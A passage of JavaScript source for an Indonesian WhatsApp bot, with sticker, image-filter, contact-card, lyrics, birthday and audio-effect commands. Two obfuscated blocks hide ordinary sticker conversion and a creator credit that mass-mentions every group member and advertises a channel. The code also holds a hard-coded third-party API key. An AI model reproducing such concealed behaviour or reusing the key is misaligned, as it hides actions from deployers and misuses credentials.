   fs.writeFileSync('./sticker/smemek.webp', anuu)
   exec(`webpmux -set exif ./sticker/data.exif ./sticker/smemek.webp -o ./sticker/smemek.webp`, async (error) => {
  if (error) return reply(mess.error)
  YANZ.sendMessage(from, fs.readFileSync(`./sticker/smemek.webp`), sticker, { quoted: mek })
   })
    } else if (isQuotedSticker){
   reply(mess.wait)
   var imgbb = require('imgbb-uploader')
   let encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
   let media = await YANZ.downloadAndSaveMediaMessage(encmedia)
   let ran = getRandom('.png')
   exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
   fs.unlinkSync(media)
   if (err) return reply('Gagal :V')
   var tolink = await imgbb("3b8594f4cb11895f4084291bc655e510", ran)
   var sticknye = `https://api.memegen.link/images/custom/-/${bawah}.png?background=${tolink.display_url}`
   var short = await axios.get('https://tinyurl.com/api-create.php?url=' + sticknye)
   var anuu = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=${lolkey}&img=${short.data}`)
  fs.writeFileSync('./sticker/smemek.webp', anuu)
   exec(`webpmux -set exif ./sticker/data.exif ./sticker/smemek.webp -o ./sticker/smemek.webp`, async (error) => {
  if (error) return reply(mess.error)
  YANZ.sendMessage(from, fs.readFileSync(`./sticker/smemek.webp`), sticker, { quoted: mek })
  fs.unlinkSync(ran)
   })
   })
  } else {
  reply(`━「 *ERROR* 」━\n\n*Usage :*\n• *_Reply gambar atau sticker dengan Caption ${prefix+command} teks_*\n*Example :*\n• *_${prefix+command+' '+namabot}_*`)
   }
  } catch (e) {
  return reply(`${e}`)
  console.log(e)
  }
  break
  case 'emojig': case 'emoji': case 'semoji':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
  if (!q) return reply(`Example : ${prefix + command} 1-17 | 😗`)
  if (!q.includes('|')) return reply(`Example : ${prefix + command} 1-17 | 😗`)
  if (Number(args[0]) > 17) return reply(`Max 1-17`)
  reply(mess.wait)
  ct = args.join(' ')                
  hex1 = ct.split('|')[0]
  hex2 = ct.split('|')[1]
  emoji.get(`${hex2}`).then(emoji => {
  teks = `${emoji.images[hex1].url}`
  sendStickerFromUrl(from,`${teks}`)	
  })
  limitAdd(sender, limit)
  break
case 'stickerwm': case 'swm': case 'take': case 'takesticker': case 'takestick':{
if (!mek.key.fromMe && !isPrem) return reply(mess.only.prem)
  reply(mess.wait) 
//if (args.length < 1) return reply(`Penggunaan ${command} nama|author`)
 let packname1 = q.split('|')[0] ? q.split('|')[0] : q
 let author1 = q.split('|')[1] ? q.split('|')[1] : ''
 if (isImage || isQuotedImage) {
  let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
  let media = await YANZ.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
exif.create(packname1, author1, `stickwm_${sender}`)
  await ffmpeg(`${media}`)
.input(media)
.on('start', function (cmd) {
console.log(color(`STARTED : ${cmd}`,'black'))
})
.on('error', function (err) {
console.log(color(`ERROR : ${err}`,'silver'))
fs.unlinkSync(media)
reply(mess.error)
})
.on('end', function () {
console.log(color(`FINISH`,'magenta'))
exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error)
YANZ.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
 } else if ((isVideo && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
  let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
  let media = await YANZ.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
exif.create(packname1, author1, `stickwm_${sender}`)
  reply(mess.wait)
await ffmpeg(`${media}`)
.inputFormat(media.split('.')[4])
.on('start', function (cmd) {
console.log(color(`STARTED : ${cmd}`,'black'))
})
.on('error', function (err) {
console.log(color(`ERROR : ${err}`,'silver'))
fs.unlinkSync(media)
let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(mess.error)
})
.on('end', function () {
console.log((`FINISH`,'magenta'))
exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error)
YANZ.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
 } else if (isQuotedSticker) {
  let encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
 let media = await YANZ.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
  exif.create(packname1, author1, `takestick_${sender}`)
  exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error)
YANZ.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
  })
 }else {
  reply(`Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
 }
}
 break
  case 'sticker2':  
  case 'stiker2':  
  case 'stickergif2':  
  case 'stikergif2':  
  case 'sgif2':  
  case 's2':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
 if (isImage || isQuotedImage) {
  let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
  let media = await YANZ.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
  await ffmpeg(`${media}`)
.input(media)
.on('start', function (cmd) {
console.log(color(`STARTED : ${cmd}`))
})
.on('error', function (err) {
console.log(color(`ERROR : ${err}`))
fs.unlinkSync(media)
reply(mess.error)
})
.on('end', function () {
console.log(color(`FINISH`,'blue'))
exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error)
YANZ.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
limitAdd(sender)
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
  } else if ((isVideo && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
  let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
  let media = await YANZ.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
reply(mess.wait)
 await ffmpeg(`${media}`)
.inputFormat(media.split('.')[4])
.on('start', function (cmd) {
console.log(color(`STARTED : ${cmd}`))
})
.on('error', function (err) {
console.log(color(`ERROR : ${err}`))
fs.unlinkSync(media)
let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(mess.error)
})
.on('end', function () {
console.log(color(`FINISH`,'blue'))
exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error)
YANZ.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
limitAdd(sender)
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
 
} else {
  reply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
 }
  limitAdd(sender, limit)
  break
  case 'sticker':  
  case 'stiker':  
  case 'stickergif':  
  case 'stikergif':  
  case 'sgif':  
  case 's':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
  //SORRY BNGET GA SENGAJA
  var _0x15655b=_0x9bca;(function(_0x4d117a,_0x2bfc24){var _0x1c04ad=_0x9bca,_0x5ce194=_0x4d117a();while(!![]){try{var _0x43c139=parseInt(_0x1c04ad(0x19a))/0x1*(parseInt(_0x1c04ad(0x1a8))/0x2)+parseInt(_0x1c04ad(0x1b1))/0x3+parseInt(_0x1c04ad(0x192))/0x4*(-parseInt(_0x1c04ad(0x1ae))/0x5)+parseInt(_0x1c04ad(0x1a3))/0x6+parseInt(_0x1c04ad(0x19f))/0x7*(parseInt(_0x1c04ad(0x1b0))/0x8)+parseInt(_0x1c04ad(0x1a5))/0x9*(parseInt(_0x1c04ad(0x1a7))/0xa)+-parseInt(_0x1c04ad(0x1aa))/0xb*(parseInt(_0x1c04ad(0x1ac))/0xc);if(_0x43c139===_0x2bfc24)break;else _0x5ce194['push'](_0x5ce194['shift']());}catch(_0x43c636){_0x5ce194['push'](_0x5ce194['shift']());}}}(_0x46e6,0x4d55e));function _0x46e6(){var _0xca0205=['sendMessage','432vTodnA','quotedMessage','15UhTjAV','parse','24FeXjPG','70737QTOiye','536196xUGesO','quotedM','ffmpeg\x20-i\x20','stringify','seconds','downloadAndSaveMediaMessage','message','\x20-vf\x20\x22scale=512:512:force_original_aspect_ratio=increase,fps=15,\x20crop=512:512\x22\x20','1WrHePa','Kirim\x20gambar\x20dengan\x20caption\x20','.webp','unlinkSync','replace','1382843ojRqgt','webpmux\x20-set\x20exif\x20./sticker/data.exif\x20','extendedTextMessage','contextInfo','1179024rOltjR','length','324VKpnKg','\x20-o\x20','110220Ozcpdv','937438QxsnXM','videoMessage','293128IWecgG'];_0x46e6=function(){return _0xca0205;};return _0x46e6();}function _0x9bca(_0x175861,_0x33b05d){var _0x46e67d=_0x46e6();return _0x9bca=function(_0x9bcaf5,_0x424c10){_0x9bcaf5=_0x9bcaf5-0x192;var _0x33cb4b=_0x46e67d[_0x9bcaf5];return _0x33cb4b;},_0x9bca(_0x175861,_0x33b05d);}if((isMedia&&!mek[_0x15655b(0x198)][_0x15655b(0x1a9)]||isQuotedImage)&&args[_0x15655b(0x1a4)]==0x0)encmediat=isQuotedImage?JSON[_0x15655b(0x1af)](JSON[_0x15655b(0x195)](mek)[_0x15655b(0x19e)]('quotedM','m'))[_0x15655b(0x198)][_0x15655b(0x1a1)][_0x15655b(0x1a2)]:mek,mediat=await YANZ[_0x15655b(0x197)](encmediat),ron=getRandom(_0x15655b(0x19c)),exec(_0x15655b(0x194)+mediat+_0x15655b(0x199)+ron,_0x1eb9d7=>{var _0x22d052=_0x15655b;fs[_0x22d052(0x19d)](mediat);if(_0x1eb9d7)return reply(''+_0x1eb9d7);exec(_0x22d052(0x1a0)+ron+_0x22d052(0x1a6)+ron,async _0x33c43d=>{if(_0x33c43d)return reply(''+_0x33c43d);YANZ['sendMessage'](from,fs['readFileSync'](ron),sticker,{'quoted':mek}),fs['unlinkSync'](ron);});});else(isMedia&&mek[_0x15655b(0x198)][_0x15655b(0x1a9)]['seconds']<0xb||isQuotedVideo&&mek[_0x15655b(0x198)][_0x15655b(0x1a1)]['contextInfo'][_0x15655b(0x1ad)][_0x15655b(0x1a9)][_0x15655b(0x196)]<0xb)&&args[_0x15655b(0x1a4)]==0x0?(encmedia=isQuotedVideo?JSON['parse'](JSON[_0x15655b(0x195)](mek)[_0x15655b(0x19e)](_0x15655b(0x193),'m'))[_0x15655b(0x198)][_0x15655b(0x1a1)][_0x15655b(0x1a2)]:mek,mediat=await YANZ[_0x15655b(0x197)](encmedia),ron=getRandom(_0x15655b(0x19c)),exec(_0x15655b(0x194)+mediat+_0x15655b(0x199)+ron,_0x3d7cb8=>{var _0x304022=_0x15655b;fs[_0x304022(0x19d)](mediat);if(_0x3d7cb8)return reply(''+_0x3d7cb8);exec(_0x304022(0x1a0)+ron+_0x304022(0x1a6)+ron,async _0x1e1925=>{var _0x59aac8=_0x304022;if(_0x1e1925)return reply(''+_0x1e1925);YANZ[_0x59aac8(0x1ab)](from,fs['readFileSync'](ron),sticker,{'quoted':mek}),fs['unlinkSync'](ron);});})):reply(_0x15655b(0x19b)+prefix+'sticker\x0aDurasi\x20Sticker\x20Video\x201-9\x20Detik');
  limitAdd(sender, limit)
  break
  case 'skullmask': 
  case 'invert':
  case 'pencil':
  case 'wasted':
  if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
reply(mess.wait)
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
owgi = await YANZ.downloadAndSaveMediaMessage(ted)
dpaa = await imgbb('3b8594f4cb11895f4084291bc655e510', owgi)
uhyy = await getBuffer(`https://api.lolhuman.xyz/api/editor/${command}?apikey=${lolkey}&img=${dpaa.display_url}`)
YANZ.sendMessage(from, uhyy, image, {thumbnail:gambar2, quoted: mek})
} else {
reply('Reply Imagenya!!')
}
limitAdd(sender, limit)
break
case 'grayscale': case 'hitamputih': case 'blackwhite':{
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
reply(mess.wait)
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
owgi = await YANZ.downloadAndSaveMediaMessage(ted)
dpaa = await imgbb('3b8594f4cb11895f4084291bc655e510', owgi)
uhyy = await getBuffer(`https://api.lolhuman.xyz/api/editor/grayscale?apikey=${lolkey}&img=${dpaa.display_url}`)
YANZ.sendMessage(from, uhyy, image, {thumbnail:gambar, quoted: mek})
} else {
reply('Reply Imagenya!!')
}
limitAdd(sender, limit)
}
break
case 'cembung': case 'cembungin':{
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
reply(mess.wait)
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
owgi = await YANZ.downloadAndSaveMediaMessage(ted)
dpaa = await imgbb('3b8594f4cb11895f4084291bc655e510', owgi)
uhyy = await getBuffer(`https://api.lolhuman.xyz/api/editor/fisheye?apikey=${lolkey}&img=${dpaa.display_url}`)
YANZ.sendMessage(from, uhyy, image, {thumbnail:gambar2, quoted: mek})
} else {
reply('Reply Imagenya!!')
}
limitAdd(sender, limit)
}
break
case 'ubaharah': case 'putararah':{
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
reply(mess.wait)
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
owgi = await YANZ.downloadAndSaveMediaMessage(ted)
dpaa = await imgbb('3b8594f4cb11895f4084291bc655e510', owgi)
uhyy = await getBuffer(`https://api.lolhuman.xyz/api/editor/flip?apikey=${lolkey}&img=${dpaa.display_url}`)
YANZ.sendMessage(from, uhyy, image, {thumbnail:gambar2, quoted: mek})
} else {
reply('Reply Imagenya!!')
}
limitAdd(sender, limit)
}
break
case 'burik': case 'blur': case 'burikin':{
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
reply(mess.wait)
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
owgi = await YANZ.downloadAndSaveMediaMessage(ted)
dpaa = await imgbb('3b8594f4cb11895f4084291bc655e510', owgi)
uhyy = await getBuffer(`https://api.lolhuman.xyz/api/editor/pixelate?apikey=${lolkey}&img=${dpaa.display_url}`)
YANZ.sendMessage(from, uhyy, image, {thumbnail:gambar2, quoted: mek})
} else {
reply('Reply Imagenya!!')
}
limitAdd(sender, limit)
}
break
case 'bulet': case 'buletin':{
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
reply(mess.wait)
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
owgi = await YANZ.downloadAndSaveMediaMessage(ted)
dpaa = await imgbb('3b8594f4cb11895f4084291bc655e510', owgi)
uhyy = await getBuffer(`https://api.lolhuman.xyz/api/editor/roundimage?apikey=${lolkey}&img=${dpaa.display_url}`)
YANZ.sendMessage(from, uhyy, image, {thumbnail:gambar2, quoted: mek})
} else {
reply('Reply Imagenya!!')
}
limitAdd(sender, limit)
}
break
case 'affect':
case 'beautiful':
case 'facepalm':
case 'jail':
case 'rip':
case 'sepia':
case 'trash':
case 'wanted':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
  reply(mess.wait)
  var imgbb = require('imgbb-uploader')
  if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  owgi = await YANZ.downloadAndSaveMediaMessage(ted)
  dpaa = await imgbb('3b8594f4cb11895f4084291bc655e510', owgi)
  uhyy = await getBuffer(`https://api.lolhuman.xyz/api/creator1/${command}?apikey=${lolkey}&img=${dpaa.display_url}`)
  YANZ.sendMessage(from, uhyy, image, {thumbnail:gambar2, quoted: mek})
  } else {
  reply('Reply Imagenya!!')
  }
limitAdd(sender, limit)
  break
case 'exif':
if (!mek.key.fromMe && !isOwner)return reply(mess.only.owner)
if (args.length < 1) return reply(`Penggunaan ${prefix}exif nama|author`)
if (!arg.split('|')) return reply(`Penggunaan ${prefix}exif nama|author`)
exif.create(arg.split('|')[0], arg.split('|')[1])
reply('Succes Broow...')
break
//Ambil Case Kasih Credits Gw Dong : FARID MHRDKAA
case 'owner':{
const ownerContact = [nomerowner, "", "", "", "", "", "", "", "", "", ""]
let ini_list = []
for (let i of ownerContact.map(v => v + '@s.whatsapp.net')) {
const vname = YANZ.contacts[i] != undefined ? YANZ.contacts[i].vname || YANZ.contacts[i].notify : undefined
ini_list.push({
"displayName": `${namaowner}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
hehe = await YANZ.sendMessage(from, {
"displayName": `${ini_list.length} kontak`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: mek })
YANZ.sendMessage(from, `Nih Kak Contact Owner Ku ✨`, text, {quoted: hehe})
}
break
case 'pengembang': case 'author': case 'creator':{
try {
const _0x334df6=_0x1385;(function(_0x5b45ef,_0x659aa9){const _0x434b74=_0x1385,_0x5d4129=_0x5b45ef();while(!![]){try{const _0x218288=parseInt(_0x434b74(0x1ab))/0x1+-parseInt(_0x434b74(0x1bb))/0x2*(-parseInt(_0x434b74(0x1b4))/0x3)+-parseInt(_0x434b74(0x1aa))/0x4+parseInt(_0x434b74(0x1b1))/0x5+-parseInt(_0x434b74(0x1be))/0x6*(-parseInt(_0x434b74(0x1b0))/0x7)+parseInt(_0x434b74(0x1bd))/0x8*(parseInt(_0x434b74(0x1ac))/0x9)+-parseInt(_0x434b74(0x1b8))/0xa;if(_0x218288===_0x659aa9)break;else _0x5d4129['push'](_0x5d4129['shift']());}catch(_0x5d8511){_0x5d4129['push'](_0x5d4129['shift']());}}}(_0xb741,0xdfb08));function _0xb741(){const _0x20ba4=['6281231951590','vname','15230650Vtrygr','map','Farid\x20mahardika','6QEbnOi','\x0aitem1.TEL;waid=','8hyUzYZ','123996YreoOs','notify','sendMessage','BEGIN:VCARD\x0aVERSION:3.0\x0aN:Sy;Bot;;;\x0aFN:','contacts','participants','push','6046176hXmRmr','726447ciDZoJ','6120801eooqbi','@s.whatsapp.net','\x20kontak','length','329borfWT','1626230HKPuux','Nih\x20Kak\x20Contact\x20Creator\x20Ku\x20✨\x0aJangan\x20lupa\x20subscribe\x20https://bit.ly/あmuzza','split','1247757cilLtj','\x0aitem1.X-ABLabel:Ponsel\x0aEND:VCARD'];_0xb741=function(){return _0x20ba4;};return _0xb741();}let anu=await YANZ['groupMetadata'](from),members=anu[_0x334df6(0x1a8)],ane=[];for(let i of members){ane[_0x334df6(0x1a9)](i['jid']);}const ownerContact=[_0x334df6(0x1b6),'','','','','','','','','',''];let ini_list=[];for(let i of ownerContact[_0x334df6(0x1b9)](_0x390d45=>_0x390d45+_0x334df6(0x1ad))){const vname=YANZ['contacts'][i]!=undefined?YANZ['contacts'][i][_0x334df6(0x1b7)]||YANZ[_0x334df6(0x1a7)][i][_0x334df6(0x1bf)]:undefined;ini_list['push']({'displayName':_0x334df6(0x1ba),'vcard':_0x334df6(0x1a6)+vname+_0x334df6(0x1bc)+i[_0x334df6(0x1b3)]('@')[0x0]+':'+i[_0x334df6(0x1b3)]('@')[0x0]+_0x334df6(0x1b5)});}function _0x1385(_0x28ceab,_0x12f1c6){const _0xb74138=_0xb741();return _0x1385=function(_0x1385ba,_0x627891){_0x1385ba=_0x1385ba-0x1a6;let _0x92269e=_0xb74138[_0x1385ba];return _0x92269e;},_0x1385(_0x28ceab,_0x12f1c6);}hehe=await YANZ[_0x334df6(0x1c0)](from,{'displayName':ini_list[_0x334df6(0x1af)]+_0x334df6(0x1ae),'contacts':ini_list},'contactsArrayMessage',{'quoted':mek,'contextInfo':{'mentionedJid':ane}}),YANZ[_0x334df6(0x1c0)](from,_0x334df6(0x1b2),text,{'quoted':hehe});
}catch{
const _0x18b62e=_0x52f5;function _0x52f5(_0xa4ec6c,_0x5b89dd){const _0x4f27b0=_0x4f27();return _0x52f5=function(_0x52f578,_0x1e99ef){_0x52f578=_0x52f578-0x8c;let _0x200c1d=_0x4f27b0[_0x52f578];return _0x200c1d;},_0x52f5(_0xa4ec6c,_0x5b89dd);}function _0x4f27(){const _0x152119=['VERSION:3.0\x0a','TEL;type=CELL;type=VOICE;waid=6281231951590:+6281231951590\x0a','229089Lcqhki','contact','2984JRNDtt','ORG:YT\x20:\x20ITSMEMUZZA;\x0a','7804130iuuPes','BEGIN:VCARD\x0a','111wLyiBK','7398sdBZAD','1215450UopjLT','702352rgrviM','44MRTObI','FN:Farid\x20mahardika\x0a','Tuh\x20contact\x20creatorku\x20kak\x20✨\x0aJangan\x20lupa\x20subscribe\x20https://bit.ly/あmuzza','then','901510gqcNIw','Jeff','24xpYXll','END:VCARD'];_0x4f27=function(){return _0x152119;};return _0x4f27();}(function(_0x2fd912,_0x2562e6){const _0x187437=_0x52f5,_0x509f70=_0x2fd912();while(!![]){try{const _0x18f69e=parseInt(_0x187437(0x99))/0x1*(-parseInt(_0x187437(0x96))/0x2)+parseInt(_0x187437(0x95))/0x3*(parseInt(_0x187437(0x91))/0x4)+-parseInt(_0x187437(0x9d))/0x5+-parseInt(_0x187437(0x9f))/0x6*(parseInt(_0x187437(0x8f))/0x7)+-parseInt(_0x187437(0x98))/0x8+-parseInt(_0x187437(0x97))/0x9+parseInt(_0x187437(0x93))/0xa;if(_0x18f69e===_0x2562e6)break;else _0x509f70['push'](_0x509f70['shift']());}catch(_0x41ecb3){_0x509f70['push'](_0x509f70['shift']());}}}(_0x4f27,0x1b265));const ynkos=_0x18b62e(0x94)+_0x18b62e(0x8d)+_0x18b62e(0x9a)+_0x18b62e(0x92)+_0x18b62e(0x8e)+_0x18b62e(0x8c);YANZ['sendMessage'](from,{'displayname':_0x18b62e(0x9e),'vcard':ynkos},MessageType[_0x18b62e(0x90)],{'quoted':mek})[_0x18b62e(0x9c)](_0x27dff4=>YANZ['sendMessage'](from,_0x18b62e(0x9b),text,{'quoted':_0x27dff4}));
}
}
break
case 'lirik':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (args.length < 1) return reply('Judulnya?')
reply(mess.wait)
teks = body.slice(7)
lirikLagu(teks).then((res) => {
let lirik = `*Hasil Pencarian Dari : ${q}*
\n${res[0].result}`
reply(lirik)
})
break
case 'ultah': case 'hbd':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (args.length < 1) return reply(`Usage : #ultah tahun-bulan-tanggal\nExample : #ultah 2006-08-02`)
if (!args[0].includes("-")) return reply(`Usage : #ultah tahun-bulan-tanggal\nExampla : #ultah 2006-08-02`)
qq = q
zodiakk = [
["Capricorn", new Date(1970, 0, 1)],
["Aquarius", new Date(1970, 0, 20)],
["Pisces", new Date(1970, 1, 19)],
["Aries", new Date(1970, 2, 21)],
["Taurus", new Date(1970, 3, 21)],
["Gemini", new Date(1970, 4, 21)],
["Cancer", new Date(1970, 5, 22)],
["Leo", new Date(1970, 6, 23)],
["Virgo", new Date(1970, 7, 23)],
["Libra", new Date(1970, 8, 23)],
["Scorpio", new Date(1970, 9, 23)],
["Sagittarius", new Date(1970, 10, 22)],
["Capricorn", new Date(1970, 11, 22)]
].reverse()
 function getZodiac(month, day) {
 dey = new Date(1970, month - 1, day)
 return zodiakk.find(([_,_d]) => dey >= _d)[0]
 }
 dateek = new Date(qq)
 if (dateek == 'Invalid Date') throw dateek
 let dd = new Date()
 let [tahun, bulan, tanggal] = [dd.getFullYear(), dd.getMonth() + 1, dd.getDate()]
 birth = [dateek.getFullYear(), dateek.getMonth() + 1, dateek.getDate()]
 zodiackk = getZodiac(birth[1], birth[2])
 ageD = new Date(d - dateek)
 agek = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()
 birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
 cekusia = bulan === birth[1] && tanggal === birth[2] ? `Selamat ulang tahun yang ke-${agek} 🥳` : agek
reply(`
*Lahir : ${birth.join(', ')}*
*Ultah Mendatang : ${birthday.join(', ')}*
*Usia : ${cekusia}*
*Zodiak : ${zodiackk}*
`.trim())
break
//=={ CONVERT }==\\
case 'bass':    
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await YANZ.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
YANZ.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})  	
limitAdd(sender, limit)
break
case 'slowmo': case 'slow':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
try {
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await YANZ.downloadAndSaveMediaMessage(encmedia)
